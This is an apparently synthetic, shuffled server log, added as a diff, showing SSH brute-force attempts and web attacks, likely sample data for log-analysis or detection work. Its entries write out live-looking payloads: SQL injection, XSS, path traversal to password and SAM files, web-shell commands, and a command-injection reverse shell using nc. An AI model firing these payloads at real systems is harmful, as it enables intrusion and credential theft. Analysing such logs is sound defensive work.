+Dec 15 20:25:00 server1 systemd[1]: Started Session 149 of user deploy.
+Dec 15 14:10:18 server1 sshd[12345]: Failed password for invalid user www-data from 185.220.101.46 port 44496 ssh2
+Dec 15 14:23:15 server1 sshd[12345]: Failed password for invalid user admin from 45.154.255.147 port 58793 ssh2
+2024-12-15T11:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 139
+Dec 15 14:03:09 server1 sshd[12345]: Failed password for invalid user ubuntu from 192.168.100.50 port 17575 ssh2
+Dec 15 14:20:03 server1 sshd[12345]: Failed password for invalid user root from 192.168.100.50 port 51500 ssh2
+2024-12-15T17:20:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 155
+2024-12-15T15:05:10.000000+0800 91.121.87.18 - - "POST /products.php?id=' OR 1=1-- HTTP/1.1" 200 1290
+Dec 15 20:10:00 server1 sudo[4947]: check pass; user unknown; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:24:03 server1 sshd[12345]: Failed password for invalid user deploy from 103.35.74.12 port 38682 ssh2
+Dec 15 14:02:42 server1 sshd[12345]: Failed password for invalid user administrator from 45.154.255.147 port 19519 ssh2
+Dec 15 14:17:30 server1 sshd[12345]: Failed password for invalid user mysql from 192.168.100.50 port 59004 ssh2
+2024-12-15T15:07:10.000000+0800 185.220.101.46 - - "GET /products.php?id='; DROP TABLE users-- HTTP/1.1" 403 1663
+Dec 15 14:15:54 server1 sshd[12345]: Failed password for invalid user administrator from 185.220.101.46 port 20682 ssh2
+Dec 15 14:13:15 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 21726 ssh2
+2024-12-15T15:07:30.000000+0800 91.121.87.18 - - "POST /products.php?id=admin'-- HTTP/1.1" 403 4322
+Dec 15 14:18:03 server1 sshd[12345]: Failed password for invalid user git from 185.220.101.46 port 34456 ssh2
+Dec 15 14:10:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 13:10:00 server1 systemd[1]: Started Session 62 of user deploy.
+Dec 15 14:04:39 server1 sshd[12345]: Failed password for invalid user postgres from 45.154.255.147 port 56437 ssh2
+Dec 15 14:07:06 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 52574 ssh2
+2024-12-15T17:00:36.000000+0800 91.121.87.18 - - "GET /files/..%2f..%2fetc%2fshadow HTTP/1.1" 200 1255
+Dec 15 08:40:00 server1 systemd[1]: Started Session 8 of user deploy.
+Dec 15 14:20:21 server1 sshd[12345]: Failed password for invalid user ftpuser from 10.0.0.100 port 31103 ssh2
+2024-12-15T20:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 616
+Dec 15 19:25:00 server1 systemd[1]: Started Session 137 of user deploy.
+2024-12-15T18:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 60
+Dec 15 17:55:00 server1 systemd[1]: Started Session 119 of user deploy.
+2024-12-15T19:00:20.000000+0800 192.168.100.50 - - "GET /ping.php?host=8.8.8.8|ls /tmp HTTP/1.1" 200 3646
+2024-12-15T15:07:40.000000+0800 10.0.0.100 - - "GET /products.php?id=' OR ''=' HTTP/1.1" 500 3402
+Dec 15 14:19:27 server1 sshd[12345]: Connection closed by 10.0.0.100 port 22 [preauth]
+2024-12-15T15:02:40.000000+0800 45.154.255.147 - - "GET /products.php?id=' OR ''=' HTTP/1.1" 403 2267
+Dec 15 14:01:21 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 52879 ssh2
+Dec 15 17:25:00 server1 systemd[1]: Started Session 113 of user deploy.
+Dec 15 14:20:48 server1 sshd[12345]: Failed password for invalid user administrator from 192.168.100.50 port 48468 ssh2
+Dec 15 14:22:45 server1 sshd[12345]: Failed password for invalid user root from 103.35.74.12 port 49490 ssh2
+Dec 15 14:02:00 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 38142 ssh2
+Dec 15 14:02:21 server1 sshd[12345]: Failed password for invalid user ftpuser from 192.168.100.50 port 19742 ssh2
+Dec 15 14:16:03 server1 sshd[12345]: Failed password for invalid user mysql from 91.121.87.18 port 14229 ssh2
+2024-12-15T17:45:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 513
+Dec 15 10:55:00 server1 systemd[1]: Started Session 35 of user deploy.
+Dec 15 14:18:15 server1 sshd[12345]: Failed password for invalid user admin from 10.0.0.100 port 20535 ssh2
+Dec 15 14:07:45 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 41269 ssh2
+Dec 15 14:01:45 server1 sshd[12345]: Failed password for invalid user mysql from 103.35.74.12 port 55662 ssh2
+Dec 15 14:24:15 server1 sshd[12345]: Failed password for invalid user oracle from 10.0.0.100 port 14619 ssh2
+Dec 15 14:05:12 server1 sshd[12345]: Failed password for invalid user postgres from 192.168.100.50 port 40152 ssh2
+Dec 15 21:00:00 server1 sudo[7292]: PAM: authentication failure; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:18:45 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 41007 ssh2
+2024-12-15T15:03:50.000000+0800 192.168.100.50 - - "GET /products.php?id='; DROP TABLE users-- HTTP/1.1" 403 4711
+2024-12-15T11:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 301
+2024-12-15T15:35:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 123
+Dec 15 14:21:21 server1 sshd[12345]: Failed password for invalid user deploy from 45.154.255.147 port 48114 ssh2
+2024-12-15T17:01:48.000000+0800 91.121.87.18 - - "GET /files/%2e%2e/etc/passwd HTTP/1.1" 200 539
+Dec 15 14:18:21 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 20476 ssh2
+Dec 15 14:17:51 server1 sshd[12345]: Failed password for invalid user www-data from 185.220.101.46 port 32504 ssh2
+Dec 15 08:25:00 server1 systemd[1]: Started Session 5 of user deploy.
+Dec 15 14:04:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 14:22:42 server1 sshd[12345]: Failed password for invalid user guest from 91.121.87.18 port 56734 ssh2
+Dec 15 14:07:36 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 37776 ssh2
+Dec 15 14:14:48 server1 sshd[12345]: Failed password for invalid user oracle from 91.121.87.18 port 54734 ssh2
+2024-12-15T15:07:50.000000+0800 192.168.100.50 - - "GET /products.php?id=1; EXEC xp_cmdshell('whoami')-- HTTP/1.1" 500 324
+Dec 15 14:15:18 server1 sshd[12345]: Failed password for invalid user git from 45.154.255.147 port 50429 ssh2
+Dec 15 14:06:30 server1 sshd[12345]: Failed password for invalid user root from 103.35.74.12 port 23117 ssh2
+Dec 15 14:24:30 server1 sshd[12345]: Failed password for invalid user admin from 10.0.0.100 port 49497 ssh2
+2024-12-15T15:08:00.000000+0800 45.154.255.147 - - "POST /products.php?id=-1 UNION ALL SELECT @@version,user(),database()-- HTTP/1.1" 500 1136
+Dec 15 14:11:21 server1 sshd[12345]: Failed password for invalid user admin from 192.168.100.50 port 37431 ssh2
+2024-12-15T16:03:15.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Cbody onload=alert(1)%3E HTTP/1.1" 200 957
+2024-12-15T16:04:15.000000+0800 10.0.0.100 - - "GET /search.php?q=%3Cimg src=x onerror=alert(1)%3E HTTP/1.1" 200 643
+Dec 15 14:05:36 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 39965 ssh2
+Dec 15 14:22:51 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 28250 ssh2
+2024-12-15T15:04:30.000000+0800 45.154.255.147 - - "POST /products.php?id=1; EXEC xp_cmdshell('whoami')-- HTTP/1.1" 403 625
+Dec 15 21:25:00 server1 systemd[1]: Started Session 161 of user deploy.
+Dec 15 14:02:12 server1 sshd[12345]: Failed password for invalid user ftpuser from 10.0.0.100 port 42834 ssh2
+Dec 15 14:16:36 server1 sshd[12345]: Failed password for invalid user administrator from 45.154.255.147 port 19724 ssh2
+2024-12-15T23:30:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 108
+Dec 15 14:24:42 server1 sshd[12345]: Failed password for invalid user ubuntu from 91.121.87.18 port 44787 ssh2
+Dec 15 14:20:39 server1 sshd[12345]: Failed password for invalid user guest from 10.0.0.100 port 20819 ssh2
+Dec 15 23:40:00 server1 systemd[1]: Started Session 188 of user deploy.
+Dec 15 14:12:42 server1 sshd[12345]: Failed password for invalid user test from 185.220.101.46 port 24454 ssh2
+2024-12-15T17:00:12.000000+0800 103.35.74.12 - - "GET /files/..\..\windows\system32\config\sam HTTP/1.1" 404 2589
+Dec 15 14:02:27 server1 sshd[12345]: Connection closed by 45.154.255.147 port 22 [preauth]
+Dec 15 14:04:09 server1 sshd[12345]: Failed password for invalid user postgres from 10.0.0.100 port 28629 ssh2
+Dec 15 14:18:51 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 32746 ssh2
+Dec 15 14:21:33 server1 sshd[12345]: Failed password for invalid user mysql from 45.154.255.147 port 37968 ssh2
+2024-12-15T10:00:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 861
+Dec 15 14:19:42 server1 sshd[12345]: Failed password for invalid user deploy from 192.168.100.50 port 32525 ssh2
+2024-12-15T18:07:30.000000+0800 10.0.0.100 - - "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200 476
+Dec 15 14:02:24 server1 sshd[12345]: Failed password for invalid user www-data from 45.154.255.147 port 12752 ssh2
+Dec 15 14:21:48 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 42322 ssh2
+2024-12-15T13:05:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 192
+Dec 15 14:10:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:19:54 server1 sshd[12345]: Failed password for invalid user git from 10.0.0.100 port 55812 ssh2
+2024-12-15T20:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 503
+Dec 15 14:20:09 server1 sshd[12345]: Failed password for invalid user test from 10.0.0.100 port 39935 ssh2
+Dec 15 14:07:42 server1 sshd[12345]: Failed password for invalid user ftpuser from 192.168.100.50 port 29581 ssh2
+Dec 15 16:10:00 server1 systemd[1]: Started Session 98 of user deploy.
+2024-12-15T08:50:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 167
+2024-12-15T16:01:00.000000+0800 103.35.74.12 - - "GET /search.php?q=%3Ciframe src='javascript:alert(1)'%3E%3C/iframe%3E HTTP/1.1" 200 370
+2024-12-15T13:35:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 98
+2024-12-15T20:20:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 88
+Dec 15 20:55:00 server1 systemd[1]: Started Session 155 of user deploy.
+Dec 15 14:18:30 server1 sshd[12345]: Failed password for invalid user root from 45.154.255.147 port 19654 ssh2
+Dec 15 14:03:57 server1 sshd[12345]: Connection closed by 45.154.255.147 port 22 [preauth]
+Dec 15 14:01:48 server1 sshd[12345]: Failed password for invalid user root from 192.168.100.50 port 45815 ssh2
+Dec 15 14:10:12 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 43736 ssh2
+Dec 15 14:15:24 server1 sshd[12345]: Failed password for invalid user admin from 45.154.255.147 port 41480 ssh2
+2024-12-15T16:05:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 181
+2024-12-15T15:06:00.000000+0800 91.121.87.18 - - "GET /products.php?id=' OR ''=' HTTP/1.1" 500 2252
+Dec 15 14:03:18 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 31753 ssh2
+Dec 15 14:21:12 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 45513 ssh2
+Dec 15 14:07:30 server1 sshd[12345]: Failed password for invalid user postgres from 10.0.0.100 port 26642 ssh2
+Dec 15 14:03:24 server1 sshd[12345]: Failed password for invalid user guest from 103.35.74.12 port 46890 ssh2
+Dec 15 14:09:48 server1 sshd[12345]: Failed password for invalid user git from 45.154.255.147 port 45590 ssh2
+Dec 15 14:19:09 server1 sshd[12345]: Failed password for invalid user git from 192.168.100.50 port 51418 ssh2
+2024-12-15T21:30:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 924
+Dec 15 14:22:00 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 48800 ssh2
+Dec 15 14:00:30 server1 sshd[12345]: Failed password for invalid user postgres from 192.168.100.50 port 33034 ssh2
+2024-12-15T23:20:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 142
+2024-12-15T17:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 497
+Dec 15 14:05:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 14:02:18 server1 sshd[12345]: Failed password for invalid user test from 45.154.255.147 port 40585 ssh2
+2024-12-15T15:04:50.000000+0800 91.121.87.18 - - "GET /products.php?id=1' ORDER BY 10-- HTTP/1.1" 403 965
+Dec 15 14:24:48 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 59791 ssh2
+2024-12-15T15:01:30.000000+0800 185.220.101.46 - - "GET /products.php?id=1' ORDER BY 10-- HTTP/1.1" 200 570
+Dec 15 14:03:39 server1 sshd[12345]: Failed password for invalid user www-data from 91.121.87.18 port 18119 ssh2
+Dec 15 14:21:30 server1 sshd[12345]: Failed password for invalid user postgres from 185.220.101.46 port 53983 ssh2
+Dec 15 14:15:30 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 54932 ssh2
+Dec 15 14:17:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+2024-12-15T16:20:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 173
+2024-12-15T15:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 797
+2024-12-15T17:30:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 389
+Dec 15 14:12:45 server1 sshd[12345]: Failed password for invalid user www-data from 192.168.100.50 port 50795 ssh2
+Dec 15 14:19:36 server1 sshd[12345]: Failed password for invalid user root from 45.154.255.147 port 46993 ssh2
+Dec 15 14:03:45 server1 sshd[12345]: Failed password for invalid user postgres from 10.0.0.100 port 28389 ssh2
+Dec 15 11:10:00 server1 systemd[1]: Started Session 38 of user deploy.
+2024-12-15T17:01:36.000000+0800 10.0.0.100 - - "GET /files/..\..\windows\system32\config\sam HTTP/1.1" 404 266
+2024-12-15T08:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 88
+Dec 15 14:18:18 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 47751 ssh2
+Dec 15 14:01:18 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 56937 ssh2
+Dec 15 14:03:54 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 32918 ssh2
+Dec 15 14:20:24 server1 sshd[12345]: Failed password for invalid user www-data from 103.35.74.12 port 16135 ssh2
+Dec 15 14:19:12 server1 sshd[12345]: Failed password for invalid user root from 192.168.100.50 port 42962 ssh2
+2024-12-15T08:35:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 178
+Dec 15 14:03:21 server1 sshd[12345]: Failed password for invalid user test from 45.154.255.147 port 46395 ssh2
+Dec 15 14:05:48 server1 sshd[12345]: Failed password for invalid user mysql from 103.35.74.12 port 15623 ssh2
+Dec 15 14:05:30 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 45202 ssh2
+Dec 15 14:12:15 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 33806 ssh2
+2024-12-15T09:45:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 610
+2024-12-15T18:02:30.000000+0800 185.220.101.46 - - "GET /uploads/shell.php HTTP/1.1" 200 351
+Dec 15 14:00:45 server1 sshd[12345]: Failed password for invalid user oracle from 185.220.101.46 port 45454 ssh2
+2024-12-15T16:05:15.000000+0800 45.154.255.147 - - "GET /search.php?q=%3Cbody onload=alert(1)%3E HTTP/1.1" 200 219
+2024-12-15T17:03:48.000000+0800 103.35.74.12 - - "GET /files//../../etc/passwd HTTP/1.1" 403 863
+Dec 15 14:09:54 server1 sshd[12345]: Failed password for invalid user mysql from 185.220.101.46 port 57715 ssh2
+Dec 15 14:04:54 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 53635 ssh2
+2024-12-15T18:08:30.000000+0800 185.220.101.46 - - "GET /uploads/shell.php?cmd=ls -la HTTP/1.1" 200 241
+Dec 15 14:08:00 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 45037 ssh2
+Dec 15 14:16:00 server1 sshd[12345]: Failed password for invalid user mysql from 192.168.100.50 port 31046 ssh2
+Dec 15 14:17:15 server1 sshd[12345]: Failed password for invalid user oracle from 45.154.255.147 port 14736 ssh2
+Dec 15 14:12:18 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 23758 ssh2
+Dec 15 14:18:27 server1 sshd[12345]: Connection closed by 91.121.87.18 port 22 [preauth]
+2024-12-15T15:03:20.000000+0800 45.154.255.147 - - "POST /products.php?id=' OR '1'='1 HTTP/1.1" 200 958
+Dec 15 14:05:54 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 18206 ssh2
+2024-12-15T18:00:30.000000+0800 91.121.87.18 - - "GET /uploads/shell.php?cmd=uname -a HTTP/1.1" 200 493
+Dec 15 14:05:00 server1 sshd[12345]: Failed password for invalid user ftpuser from 10.0.0.100 port 34795 ssh2
+2024-12-15T14:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 159
+Dec 15 14:06:03 server1 sshd[12345]: Failed password for invalid user root from 45.154.255.147 port 50452 ssh2
+Dec 15 14:19:00 server1 sshd[12345]: Failed password for invalid user guest from 192.168.100.50 port 47755 ssh2
+2024-12-15T23:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 70
+Dec 15 14:11:12 server1 sshd[12345]: Failed password for invalid user deploy from 10.0.0.100 port 27027 ssh2
+Dec 15 14:01:00 server1 sshd[12345]: Failed password for invalid user root from 10.0.0.100 port 33295 ssh2
+Dec 15 14:08:09 server1 sshd[12345]: Failed password for invalid user ubuntu from 10.0.0.100 port 52120 ssh2
+Dec 15 14:21:54 server1 sshd[12345]: Failed password for invalid user deploy from 185.220.101.46 port 22926 ssh2
+2024-12-15T17:02:36.000000+0800 91.121.87.18 - - "GET /files/..;/..;/etc/passwd HTTP/1.1" 404 1197
+2024-12-15T19:00:00.000000+0800 10.0.0.100 - - "GET /ping.php?host=8.8.8.8;cat /etc/passwd HTTP/1.1" 200 4685
+2024-12-15T17:04:00.000000+0800 192.168.100.50 - - "GET /files/..;/..;/etc/passwd HTTP/1.1" 200 281
+Dec 15 14:13:18 server1 sshd[12345]: Failed password for invalid user test from 103.35.74.12 port 14322 ssh2
+2024-12-15T19:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 448
+2024-12-15T16:35:00.000000+0800 192.168.1.101 - - "POST /api/login HTTP/1.1" 200 53
+Dec 15 14:23:45 server1 sshd[12345]: Failed password for invalid user postgres from 45.154.255.147 port 46364 ssh2
+2024-12-15T21:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 62
+Dec 15 14:09:27 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:02:48 server1 sshd[12345]: Failed password for invalid user git from 45.154.255.147 port 47259 ssh2
+2024-12-15T14:15:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 243
+Dec 15 14:11:51 server1 sshd[12345]: Failed password for invalid user www-data from 91.121.87.18 port 22053 ssh2
+Dec 15 14:14:57 server1 sshd[12345]: Connection closed by 45.154.255.147 port 22 [preauth]
+Dec 15 21:55:00 server1 systemd[1]: Started Session 167 of user deploy.
+Dec 15 14:07:12 server1 sshd[12345]: Failed password for invalid user ubuntu from 91.121.87.18 port 26128 ssh2
+Dec 15 14:07:18 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 52706 ssh2
+Dec 15 14:16:15 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 14898 ssh2
+Dec 15 14:04:30 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 51446 ssh2
+2024-12-15T16:00:15.000000+0800 91.121.87.18 - - "GET /search.php?q=%3Cimg src=x onerror=alert(1)%3E HTTP/1.1" 200 387
+2024-12-15T15:00:10.000000+0800 103.35.74.12 - - "GET /products.php?id=' OR 1=1-- HTTP/1.1" 403 182
+Dec 15 14:20:45 server1 sshd[12345]: Failed password for invalid user administrator from 10.0.0.100 port 31323 ssh2
+Dec 15 14:02:51 server1 sshd[12345]: Failed password for invalid user git from 91.121.87.18 port 31504 ssh2
+Dec 15 14:16:18 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 45172 ssh2
+Dec 15 14:21:15 server1 sshd[12345]: Failed password for invalid user admin from 103.35.74.12 port 27299 ssh2
+2024-12-15T11:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 824
+Dec 15 14:12:30 server1 sshd[12345]: Failed password for invalid user www-data from 45.154.255.147 port 48134 ssh2
+Dec 15 14:14:09 server1 sshd[12345]: Failed password for invalid user deploy from 192.168.100.50 port 44556 ssh2
+2024-12-15T21:45:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 212
+Dec 15 14:07:27 server1 sshd[12345]: Connection closed by 10.0.0.100 port 22 [preauth]
+2024-12-15T22:30:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 939
+Dec 15 14:10:15 server1 sshd[12345]: Failed password for invalid user administrator from 45.154.255.147 port 22924 ssh2
+Dec 15 14:04:33 server1 sshd[12345]: Failed password for invalid user git from 185.220.101.46 port 15953 ssh2
+Dec 15 14:11:33 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 52756 ssh2
+Dec 15 14:09:33 server1 sshd[12345]: Failed password for invalid user oracle from 103.35.74.12 port 25442 ssh2
+2024-12-15T19:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 88
+Dec 15 14:22:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:17:00 server1 sshd[12345]: Failed password for invalid user deploy from 192.168.100.50 port 11299 ssh2
+2024-12-15T08:05:00.000000+0800 10.0.0.50 - - "POST /api/login HTTP/1.1" 200 196
+Dec 15 20:40:00 server1 sudo[9230]: new group with name 'attacker'; TTY=pts/0; USER=root; COMMAND=/bin/bash
+Dec 15 14:09:15 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 39915 ssh2
+Dec 15 14:16:09 server1 sshd[12345]: Failed password for invalid user administrator from 91.121.87.18 port 46812 ssh2
+Dec 15 11:40:00 server1 systemd[1]: Started Session 44 of user deploy.
+2024-12-15T09:20:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 194
+Dec 15 14:17:09 server1 sshd[12345]: Failed password for invalid user ftpuser from 45.154.255.147 port 44896 ssh2
+2024-12-15T10:30:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 366
+Dec 15 14:07:09 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 26392 ssh2
+Dec 15 14:14:18 server1 sshd[12345]: Failed password for invalid user git from 185.220.101.46 port 11328 ssh2
+Dec 15 14:10:09 server1 sshd[12345]: Failed password for invalid user mysql from 103.35.74.12 port 30739 ssh2
+Dec 15 14:24:33 server1 sshd[12345]: Failed password for invalid user admin from 45.154.255.147 port 46387 ssh2
+Dec 15 12:55:00 server1 systemd[1]: Started Session 59 of user deploy.
+2024-12-15T13:00:00.000000+0800 192.168.1.100 - - "GET /api/users HTTP/1.1" 200 274
+Dec 15 14:06:18 server1 sshd[12345]: Failed password for invalid user www-data from 10.0.0.100 port 54258 ssh2
+2024-12-15T16:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 123
+2024-12-15T18:03:00.000000+0800 185.220.101.46 - - "GET /uploads/shell.php?cmd=uname -a HTTP/1.1" 200 473
+Dec 15 14:23:27 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+Dec 15 14:01:33 server1 sshd[12345]: Failed password for invalid user administrator from 10.0.0.100 port 55893 ssh2
+Dec 15 14:16:42 server1 sshd[12345]: Failed password for invalid user deploy from 91.121.87.18 port 51397 ssh2
+Dec 15 17:10:00 server1 systemd[1]: Started Session 110 of user deploy.
+Dec 15 14:08:30 server1 sshd[12345]: Failed password for invalid user ubuntu from 103.35.74.12 port 22829 ssh2
+Dec 15 14:15:03 server1 sshd[12345]: Failed password for invalid user oracle from 10.0.0.100 port 20738 ssh2
+Dec 15 14:18:57 server1 sshd[12345]: Connection closed by 192.168.100.50 port 22 [preauth]
+2024-12-15T16:03:45.000000+0800 185.220.101.46 - - "GET /search.php?q=%3Csvg%3E%3Cx%3E%3Canimate onbegin=alert(1) attributeName=x%3E%3C/svg%3E HTTP/1.1" 200 116
+Dec 15 14:11:03 server1 sshd[12345]: Failed password for invalid user www-data from 185.220.101.46 port 47587 ssh2
+Dec 15 14:10:51 server1 sshd[12345]: Failed password for invalid user root from 103.35.74.12 port 54305 ssh2
+Dec 15 14:40:00 server1 systemd[1]: Started Session 80 of user deploy.
+Dec 15 14:10:24 server1 sshd[12345]: Failed password for invalid user test from 192.168.100.50 port 27136 ssh2
+Dec 15 14:21:06 server1 sshd[12345]: Failed password for invalid user guest from 45.154.255.147 port 15610 ssh2
+2024-12-15T12:30:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 658
+Dec 15 14:20:30 server1 sshd[12345]: Failed password for invalid user oracle from 91.121.87.18 port 38769 ssh2
+Dec 15 14:08:15 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 51973 ssh2
+Dec 15 14:23:24 server1 sshd[12345]: Failed password for invalid user admin from 103.35.74.12 port 54481 ssh2
+2024-12-15T18:03:30.000000+0800 103.35.74.12 - - "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 285
+Dec 15 14:07:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:21:45 server1 sshd[12345]: Failed password for invalid user admin from 10.0.0.100 port 37946 ssh2
+Dec 15 14:12:51 server1 sshd[12345]: Failed password for invalid user administrator from 103.35.74.12 port 13715 ssh2
+Dec 15 14:11:54 server1 sshd[12345]: Failed password for invalid user oracle from 45.154.255.147 port 24814 ssh2
+Dec 15 14:04:21 server1 sshd[12345]: Failed password for invalid user admin from 185.220.101.46 port 40239 ssh2
+Dec 15 20:40:00 server1 systemd[1]: Started Session 152 of user deploy.
+Dec 15 14:21:00 server1 sshd[12345]: Failed password for invalid user root from 91.121.87.18 port 38450 ssh2
+Dec 15 14:01:51 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 21788 ssh2
+Dec 15 14:05:15 server1 sshd[12345]: Failed password for invalid user root from 185.220.101.46 port 16700 ssh2
+2024-12-15T21:50:00.000000+0800 192.168.1.100 - - "POST /api/login HTTP/1.1" 200 145
+Dec 15 14:23:21 server1 sshd[12345]: Failed password for invalid user test from 10.0.0.100 port 56480 ssh2
+Dec 15 14:00:18 server1 sshd[12345]: Failed password for invalid user www-data from 103.35.74.12 port 17574 ssh2
+Dec 15 14:24:00 server1 sshd[12345]: Failed password for invalid user git from 103.35.74.12 port 24133 ssh2
+2024-12-15T20:45:00.000000+0800 192.168.1.101 - - "GET /api/users HTTP/1.1" 200 419
+Dec 15 14:15:51 server1 sshd[12345]: Failed password for invalid user www-data from 45.154.255.147 port 38205 ssh2
+Dec 15 14:08:33 server1 sshd[12345]: Failed password for invalid user postgres from 103.35.74.12 port 25779 ssh2
+2024-12-15T09:15:00.000000+0800 10.0.0.50 - - "GET /api/users HTTP/1.1" 200 270
+2024-12-15T15:04:00.000000+0800 10.0.0.100 - - "GET /products.php?id=1 OR 1=1 HTTP/1.1" 500 2509
+Dec 15 14:22:39 server1 sshd[12345]: Failed password for invalid user oracle from 103.35.74.12 port 31711 ssh2
+Dec 15 14:19:24 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 10359 ssh2
+Dec 15 14:13:30 server1 sshd[12345]: Failed password for invalid user deploy from 103.35.74.12 port 50279 ssh2
+Dec 15 14:16:57 server1 sshd[12345]: Connection closed by 185.220.101.46 port 22 [preauth]
+Dec 15 14:09:42 server1 sshd[12345]: Failed password for invalid user postgres from 91.121.87.18 port 45644 ssh2
+2024-12-15T16:04:00.000000+0800 45.154.255.147 - - "GET /search.php?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1" 200 596
+Dec 15 14:07:15 server1 sshd[12345]: Failed password for invalid user www-data from 45.154.255.147 port 40819 ssh2
+2024-12-15T19:01:40.000000+0800 185.220.101.46 - - "GET /ping.php?host=8.8.8.8|nc -e /bin/bash 192.168.1.1 4444 HTTP/1.1" 500 4158
+Dec 15 14:04:15 server1 sshd[12345]: Failed password for invalid user ubuntu from 45.154.255.147 port 23430 ssh2
+Dec 15 14:02:03 server1 sshd[12345]: Failed password for invalid user ftpuser from 192.168.100.50 port 26255 ssh2
